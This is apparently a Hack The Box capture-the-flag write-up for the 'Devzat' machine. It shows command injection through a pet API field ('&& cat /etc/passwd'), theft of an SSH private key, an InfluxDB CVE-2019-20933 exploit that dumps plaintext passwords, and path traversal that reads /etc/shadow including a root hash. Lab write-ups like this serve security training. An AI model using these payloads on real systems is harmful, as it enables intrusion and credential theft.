[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/css/all.min.css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/css/bootstrap.min.css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/css/global.css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/favicon.ico
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/index.html
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-brands-400.eot
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-brands-400.svg
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-brands-400.ttf
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-brands-400.woff
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-brands-400.woff2
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-regular-400.eot
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-regular-400.svg
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-regular-400.ttf
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-regular-400.woff
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-regular-400.woff2
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-solid-900.eot
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-solid-900.svg
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-solid-900.ttf
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-solid-900.woff
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/public/webfonts/fa-solid-900.woff2
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/rollup.config.js
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/src
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/src/App.svelte
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/1-464614f32483e1fde60ee53f5d3b4d468d80ff62/static/src/main.js
[+] Found commit: 8274d7a547c0c3854c074579dfc359664082a8f6
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/.gitignore
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/bluewhale
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/cat
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/dog
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/giraffe
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/gopher
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/petshop
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/redkite
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/go.mod
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/go.sum
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/main.go
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/petshop
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/start.sh
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/.gitignore
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/README.md
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/package.json
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/public
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/public/css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/public/css/all.min.css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/public/css/bootstrap.min.css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/public/css/global.css
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/public/favicon.ico
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/public/index.html
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/rollup.config.js
[+] Found folder: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/src
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/src/App.svelte
[+] Found file: /home/kali/Hackthebox/Devzat/gitdump/2-8274d7a547c0c3854c074579dfc359664082a8f6/static/src/main.js
```

This leaves us with three directories. I will open this directory in Visual Code as get a bit code based here.

```
   ~/Hackthebox/Devzat/gitdump  on   master ?11 ···························································································· ✔  at 18:21:47  ─╮
╰─ ls -l                                                                                                                                                                  ─╯
total 12
drwxr-xr-x 4 kali kali 4096 Mar  9 18:20 0-ef07a04ebb2fc92cf74a39e0e4b843630666a705
drwxr-xr-x 4 kali kali 4096 Mar  9 18:20 1-464614f32483e1fde60ee53f5d3b4d468d80ff62
drwxr-xr-x 4 kali kali 4096 Mar  9 18:20 2-8274d7a547c0c3854c074579dfc359664082a8f6

```

After a few hours or cups of coffee, I located a potential code mistake. To fully understand what this page is doing, let's open burpsuite and see what the GET/POST Requests look like. 

Example GET Request to the page:
```
GET / HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Example GET Request for the API:
```
GET /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Connection: close
Cache-Control: max-age=0
```

Example POST Request for the API:
```
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 38
Connection: close

{"name":"New Pet","species":"redkite"}
```

After more enumeration throwing XXS, SSRF, SSTI, brute forcing, etc into the api. I located the source code we could manipulate.

Main.go file contents (that matter):
```
type Pet struct {
	Name            string `json:"name"`
	Species         string `json:"species"`
	Characteristics string `json:"characteristics"`
}

var (
	Pets []Pet = []Pet{
		{Name: "Cookie", Species: "cat", Characteristics: loadCharacter("cat")},
		{Name: "Mia", Species: "cat", Characteristics: loadCharacter("cat")},
		{Name: "Chuck", Species: "dog", Characteristics: loadCharacter("dog")},
		{Name: "Balu", Species: "dog", Characteristics: loadCharacter("dog")},
		{Name: "Georg", Species: "gopher", Characteristics: loadCharacter("gopher")},
		{Name: "Gustav", Species: "giraffe", Characteristics: loadCharacter("giraffe")},
		{Name: "Rudi", Species: "redkite", Characteristics: loadCharacter("redkite")},
		{Name: "Bruno", Species: "bluewhale", Characteristics: loadCharacter("bluewhale")},
	}
)

func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}

func getPets(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(Pets)
}

func addPet(w http.ResponseWriter, r *http.Request) {
	reqBody, _ := ioutil.ReadAll(r.Body)
	var addPet Pet
	err := json.Unmarshal(reqBody, &addPet)
	if err != nil {
		e := fmt.Sprintf("There has been an error: %+v", err)
		http.Error(w, e, http.StatusBadRequest)
		return
	}

	addPet.Characteristics = loadCharacter(addPet.Species)
	Pets = append(Pets, addPet)

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, "Pet was added successfully")
}

func handleRequest() {
	build, err := fs.Sub(web, "static/public/build")
	if err != nil {
		panic(err)
	}

	css, err := fs.Sub(web, "static/public/css")
	if err != nil {
		panic(err)
	}

	webfonts, err := fs.Sub(web, "static/public/webfonts")
	if err != nil {
		panic(err)
	}

	spaHandler := http.HandlerFunc(spaHandlerFunc)
	// Single page application handler
	http.Handle("/", headerMiddleware(spaHandler))

	// All static folder handler
	http.Handle("/build/", headerMiddleware(http.StripPrefix("/build", http.FileServer(http.FS(build)))))
	http.Handle("/css/", headerMiddleware(http.StripPrefix("/css", http.FileServer(http.FS(css)))))
	http.Handle("/webfonts/", headerMiddleware(http.StripPrefix("/webfonts", http.FileServer(http.FS(webfonts)))))
	http.Handle("/.git/", headerMiddleware(http.StripPrefix("/.git", http.FileServer(http.Dir(".git")))))

	// API routes
	apiHandler := http.HandlerFunc(petHandler)
	http.Handle("/api/pet", headerMiddleware(apiHandler))
	log.Fatal(http.ListenAndServe("127.0.0.1:5000", nil))
}

func spaHandlerFunc(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write(index)
}

func petHandler(w http.ResponseWriter, r *http.Request) {
	// Dispatch by method
	if r.Method == http.MethodPost {
		addPet(w, r)
	} else if r.Method == http.MethodGet {
		getPets(w, r)

	} else {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
	// TODO: Add Update and Delete
}

func headerMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Add("Server", "My genious go pet server")
		next.ServeHTTP(w, r)
	})
}
```

In the function, loadCharacter, we see it is calling a sh command to cat a file in a characteristics directory. We can do some simple input injection into the API Species filed and get code execution! I tried to make it easier to understand below:
Original 
```
func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}
```

Pseudo code of what we want to happen
```
func loadCharacter(species string) string {
	// Our species string will look like gopher && cat /etc/passwd
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}
```

### Trying out our theory
Post Request sent:
```
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 37
Connection: close



{"name":"evilpet","species":"gopher && cat /etc/passwd"}
```
It worked!
![[Pasted image 20220309183203.png]]

Now we can see if we can grab the current users SSH private key (Run 'id' as command to find current user)

![[Pasted image 20220309183334.png]]

Let's throw that into our kali and attempt to ssh as patrick to the host.

```
    ~/Hackthebox/Devzat  on   master ?11 ························································································ ✔  took 3s   at 18:34:02  ─╮
╰─ ssh -i id_rsa patrick@devzat.htb                                                                                                                                       ─╯
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 09 Mar 2022 11:34:14 PM UTC

  System load:  0.0               Processes:                238
  Usage of /:   56.0% of 7.81GB   Users logged in:          0
  Memory usage: 22%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118


107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

patrick@devzat:~$ whoami
patrick
patrick@devzat:~$ 
```

It worked!

### Privilege Escalation

Enumerating the system, we run into some of the devzat source code being hosted in patrick's home directory. 

The vulnerability is located on line 272-283 in devchat.go.

```
if u.id != "12ca17b49af2289436f303e0166030a21e525d266e209267433801a8fd4071a0" {
                for possibleName == "patrick" || possibleName == "admin" || possibleName == "catherine" {
                        u.writeln("", "Nickname reserved for local use, please choose a different one.")
                        u.term.SetPrompt("> ")
                        possibleName, err = u.term.ReadLine()
                        if err != nil {
                                l.Println(err)
                                return
                        }
                        possibleName = cleanName(possibleName)
                }
        }
```

Placing that hash into crackstation (not good OPSEC but it's a CTF :P)

![[Pasted image 20220309184226.png]]

So we can interpret the code is saying.. If we are localhost -> we can use admin, catherine, and patrick user.

We also know that from earlier the chat is running on port 8000 (also confirmed below)
```
patrick@devzat:~$ lsof -i:8000
COMMAND PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
devchat 888 patrick    7u  IPv6  35037      0t0  TCP *:8000 (LISTEN)
```
We can port forward the port 8000 to our local machine 

```
    ~/Hackthebox/Devzat  on   master ?12 ········································································································································································· ✔  took 12m 12s   at 18:46:23  ─╮
╰─ ssh -i id_rsa -L 8000:localhost:8000 patrick@devzat.htb                                                                                                                                                                                                      ─╯
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 09 Mar 2022 11:46:41 PM UTC

  System load:  0.01              Processes:                234
  Usage of /:   56.0% of 7.81GB   Users logged in:          0
  Memory usage: 22%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118


107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Mar  9 23:34:15 2022 from 10.10.14.81

```


Now we can ssh to our localhost and it will represent localhost on the devzat machine. (in a new shell, leave the ssh connection alive)

```
╭─    ~/Hackthebox/Devzat  on   master ?12 ······················································· ✔  at 18:47:24  ─╮
╰─ ssh -l patrick localhost -p 8000                                                                                          ─╯
The authenticity of host '[localhost]:8000 ([::1]:8000)' can't be established.
RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:17: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:8000' (RSA) to the list of known hosts.
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat
Welcome to the chat. There are no more users
devbot: patrick has joined the chat
patrick: 

```

Taking the hint that the machine is running influxdb. We portforwared this alternative port 8443 and it seems to me a new version of the chat running with an explicit version of the influx DB
```
╰─ ssh -i id_rsa -L 8443:localhost:8443 patrick@devzat.htb                                                                   ─╯
```

```
   ~/H/Devzat  on   master ?12 · INT ✘  took 7m 27s   at 18:54:05  ─╮
╰─ ssh -l admin localhost -p 8443                                                 ─╯
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb 1.7.5 for you as we discussed earlier in business
       meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
Welcome to the chat. There are no more users
devbot: admin has joined the chat
admin: 
```



Using this github, we are able to exploit the running DB with no changes to the script (other than port forwarding the 8086 port to locahost)

```
    ~/Hackthebox/Devzat  on   master ?12 ···································· INT ✘  took 3m 3s   at 18:57:05  ─╮
╰─ ssh -i id_rsa -L 8086:localhost:8086 patrick@devzat.htb       
```

```
╭─    ~/Hackthebox/Devzat  on   master ?11 ··········································································· ✔  at 18:58:33  ─╮
╰─ git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git                                                               ─╯
Cloning into 'InfluxDB-Exploit-CVE-2019-20933'...
remote: Enumerating objects: 37, done.
remote: Counting objects: 100% (37/37), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 37 (delta 12), reused 14 (delta 4), pack-reused 0
Receiving objects: 100% (37/37), 10.58 KiB | 10.58 MiB/s, done.
Resolving deltas: 100% (12/12), done.

╭─    ~/Hackthebox/Devzat  on   master ?12 ··········································································· ✔  at 18:58:35  ─╮
╰─ cd InfluxDB-Exploit-CVE-2019-20933                                                                                                            ─╯

╭─    ~/Hackthebox/Devzat/InfluxDB-Exploit-CVE-2019-20933  on   master ··············································· ✔  at 18:58:39  ─╮
╰─ python __main__.py                                                                                                                            ─╯

  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
 - using CVE-2019-20933

Host (default: localhost): 
Port (default: 8086): 
Username <OR> path to username file (default: users.txt): 

Bruteforcing usernames ...
[v] admin

Host vulnerable !!!

Databases:

1) devzat
2) _internal

.quit to exit
[admin@127.0.0.1] Database: 

```

```

Starting InfluxDB shell - .back to go back
[admin@127.0.0.1/devzat] $ show field keys
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "enabled",
                            "boolean"
                        ],
                        [
                            "password",
                            "string"
                        ],
                        [
                            "username",
                            "string"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
[admin@127.0.0.1/devzat] $ select * from "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
[admin@127.0.0.1/devzat] $ 
```

Great we got some creds for Catherine (we can't ssh due to being key only SSH). We can su on our already existing shell of patricks to su

```
patrick@devzat:~$ su catherine
Password: 
catherine@devzat:/home/patrick$ whoami
catherine
catherine@devzat:/home/patrick$ 
```

We can port forward back the port 8443 to see the new chat notes for catherine.

```
ssh -i id_rsa -L 8443:localhost:8443 patrick@devzat.htb                        ─╯
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

```

There are notes from patrick about a new feature implemented and to see the difference we would need to run diff on the two backups to see the code changes. Let's grab those backups from ```/var/backups``` directory on the host and pull them to catherine's home directory.

```
 ssh -l catherine localhost -p 8443                                                                                        ─╯
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups
         location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine: 
```

```
catherine@devzat:~$ cp /var/backups/devzat-* .
catherine@devzat:~$ ll
total 88
drwxr-xr-x 4 catherine catherine  4096 Mar 10 00:03 ./
drwxr-xr-x 4 root      root       4096 Jun 22  2021 ../
lrwxrwxrwx 1 root      root          9 Jun 22  2021 .bash_history -> /dev/null
-rw-r--r-- 1 catherine catherine   220 Jun 22  2021 .bash_logout
-rw-r--r-- 1 catherine catherine  3808 Jun 22  2021 .bashrc
drwx------ 2 catherine catherine  4096 Sep 21 19:35 .cache/
-rw------- 1 catherine catherine 28297 Mar 10 00:03 devzat-dev.zip
-rw------- 1 catherine catherine 27567 Mar 10 00:03 devzat-main.zip
-rw-r--r-- 1 catherine catherine   807 Jun 22  2021 .profile
drwx------ 2 catherine catherine  4096 Sep 29 16:31 .ssh/
-r-------- 1 catherine catherine    33 Mar  9 22:36 user.txt

```

unzipping both files to run diff on:

```
catherine@devzat:~$ unzip devzat-main.zip 
Archive:  devzat-main.zip
   creating: main/
  inflating: main/go.mod             
 extracting: main/.gitignore         
  inflating: main/util.go            
  inflating: main/eastereggs.go      
  inflating: main/README.md          
  inflating: main/games.go           
  inflating: main/colors.go          
 extracting: main/log.txt            
  inflating: main/commands.go        
  inflating: main/start.sh           
  inflating: main/devchat.go         
  inflating: main/LICENSE            
  inflating: main/commandhandler.go  
  inflating: main/art.txt            
  inflating: main/go.sum             
  inflating: main/allusers.json      
catherine@devzat:~$ unzip devzat-dev.zip 
Archive:  devzat-dev.zip
   creating: dev/
  inflating: dev/go.mod              
 extracting: dev/.gitignore          
  inflating: dev/util.go             
  inflating: dev/testfile.txt        
  inflating: dev/eastereggs.go       
  inflating: dev/README.md           
  inflating: dev/games.go            
  inflating: dev/colors.go           
 extracting: dev/log.txt             
  inflating: dev/commands.go         
  inflating: dev/start.sh            
  inflating: dev/devchat.go          
  inflating: dev/LICENSE             
  inflating: dev/commandhandler.go   
  inflating: dev/art.txt             
  inflating: dev/go.sum              
 extracting: dev/allusers.json       
catherine@devzat:~$ 

```

```
catherine@devzat:~$ diff main dev
diff main/allusers.json dev/allusers.json
1,3c1
< {
<    "eff8e7ca506627fe15dda5e0e512fcaad70b6d520f37cc76597fdb4f2d83a1a3": "\u001b[38;5;214mtest\u001b[39m"
< }
---
> {}
diff main/commands.go dev/commands.go
3a4
> 	"bufio"
4a6,7
> 	"os"
> 	"path/filepath"
36a40
> 		file        = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}
38c42,101
< 	commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode}
---
> 	commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file}
> }
> 
> func fileCommand(u *user, args []string) {
> 	if len(args) < 1 {
> 		u.system("Please provide file to print and the password")
> 		return
> 	}
> 
> 	if len(args) < 2 {
> 		u.system("You need to provide the correct password to use this function")
> 		return
> 	}
> 
> 	path := args[0]
> 	pass := args[1]
> 
> 	// Check my secure password
> 	if pass != "CeilingCatStillAThingIn2021?" {
> 		u.system("You did provide the wrong password")
> 		return
> 	}
> 
> 	// Get CWD
> 	cwd, err := os.Getwd()
> 	if err != nil {
> 		u.system(err.Error())
> 	}
> 
> 	// Construct path to print
> 	printPath := filepath.Join(cwd, path)
> 
> 	// Check if file exists
> 	if _, err := os.Stat(printPath); err == nil {
> 		// exists, print
> 		file, err := os.Open(printPath)
> 		if err != nil {
> 			u.system(fmt.Sprintf("Something went wrong opening the file: %+v", err.Error()))
> 			return
> 		}
> 		defer file.Close()
> 
> 		scanner := bufio.NewScanner(file)
> 		for scanner.Scan() {
> 			u.system(scanner.Text())
> 		}
> 
> 		if err := scanner.Err(); err != nil {
> 			u.system(fmt.Sprintf("Something went wrong printing the file: %+v", err.Error()))
> 		}
> 
> 		return
> 
> 	} else if os.IsNotExist(err) {
> 		// does not exist, print error
> 		u.system(fmt.Sprintf("The requested file @ %+v does not exist!", printPath))
> 		return
> 	}
> 	// bokred?
> 	u.system("Something went badly wrong.")
diff main/devchat.go dev/devchat.go
27c27
< 	port = 8000
---
> 	port = 8443
114c114
< 		fmt.Sprintf(":%d", port),
---
> 		fmt.Sprintf("127.0.0.1:%d", port),
Only in dev: testfile.txt

```

We get another credential for perhaps root! We also see there is a new command called file that takes two arguments
- File to be pasted into chat
- Password

We can assume we have the pasword so now let's see if we can dump some files.

Dumping Shadow file for password hashes:
```
ssh -l catherine localhost -p 8443                                                                                        ─╯
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups
         location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine: /file
[SYSTEM] Please provide file to print and the password
catherine: /file /etc/shadow CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/etc/shadow does not exist!
catherine: /file ../../../../../../etc/shadow CeilingCatStillAThingIn2021?
[SYSTEM] root:$6$DKdyL4hqyhhxcRyc$8N.1K/dHPqLb7VSB0IvfB.uhIKsH7IeGP/iyTRSYImFiAawsaUOKs/TWe0DCp5wSscYvi.XjX8JPe6lZNnEmH/:18891:0
         :99999:7:::
[SYSTEM] daemon:*:18659:0:99999:7:::
[SYSTEM] bin:*:18659:0:99999:7:::
[SYSTEM] sys:*:18659:0:99999:7:::
[SYSTEM] sync:*:18659:0:99999:7:::
[SYSTEM] games:*:18659:0:99999:7:::
[SYSTEM] man:*:18659:0:99999:7:::
[SYSTEM] lp:*:18659:0:99999:7:::
[SYSTEM] mail:*:18659:0:99999:7:::
[SYSTEM] news:*:18659:0:99999:7:::
[SYSTEM] uucp:*:18659:0:99999:7:::
[SYSTEM] proxy:*:18659:0:99999:7:::
[SYSTEM] www-data:*:18659:0:99999:7:::
[SYSTEM] backup:*:18659:0:99999:7:::
[SYSTEM] list:*:18659:0:99999:7:::
[SYSTEM] irc:*:18659:0:99999:7:::
[SYSTEM] gnats:*:18659:0:99999:7:::
[SYSTEM] nobody:*:18659:0:99999:7:::
[SYSTEM] systemd-network:*:18659:0:99999:7:::
[SYSTEM] systemd-resolve:*:18659:0:99999:7:::
[SYSTEM] systemd-timesync:*:18659:0:99999:7:::
[SYSTEM] messagebus:*:18659:0:99999:7:::
